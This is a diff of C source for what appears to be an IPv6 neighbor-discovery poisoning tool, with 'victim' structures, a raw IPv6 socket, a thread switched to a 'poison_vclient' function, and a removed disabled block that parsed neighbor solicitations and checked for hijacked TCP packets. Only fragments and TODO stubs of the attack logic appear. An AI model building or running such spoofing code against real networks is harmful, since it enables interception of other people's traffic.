@@ -167,53 +167,10 @@ void packet_action(char *packet) {
 		debug_cvivtim(&svictim);
 		printf("\e[0m");
 
-		if (pthread_create(&(cli->th), 0, &th_func, cli)) {
+		if (pthread_create(&(cli->th), 0, &poison_vclient, cli)) {
 			printf("Error creating thread\n");
 			//printf("Client: %s", );
 		}
-	}
-#endif
-#if 0
-	switch (ip6->ip6_nxt) {
-		case IPPROTO_ICMPV6:
-			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-			debug_packet((char *)ip6);
-			icmpv6->icmp6_cksum = 0;
-			if ((crc = icmp6_crc(icmpv6, ip6)) != 0) {
-				printf("ICMPv6: CRC ERROR\n");
-				printf("%x == %x\n", crc, icmpv6->icmp6_cksum);
-			} else {
-				printf("ICMPv6: CRC OK\n");
-			}
-
-			switch (icmpv6->icmp6_type) {
-				case ND_NEIGHBOR_SOLICIT:
-					if (!cvictim.poisoned) {
-						printf("Start poisoning..\n");
-						/* TODO:
-						if (solicitation_to_svictim(icmpv6)) {
-							cvictim.poisoned = 1;
-							poison_cvictim(ip6->ip6_src.s6_addr);	// This should be a thread
-						}
-						*/
-					}
-					break;
-				case ND_NEIGHBOR_ADVERT:
-					/* TODO: Get server's hwaddr */
-					break;
-				default:
-					break;
-			}
-			break;
-		case IPPROTO_TCP:
-			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-			/* Check if it's a hijacked packet */
-			if (!(memcmp(&device.hwaddr, eth->h_source, sizeof(struct ether_addr))) &&
-					!(memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr)))) {
-			}
-			break;
-		default:
-			break;
 	}
 #endif
 }
@@ -233,6 +190,7 @@ int main(int argc, char **argv) {
 	load_device_info(argv[1]);
 	dump_device_info();
 	init_cvictim();
+
 	/* create the raw socket */
 	raw = raw_socket(ETH_P_IPV6);
 
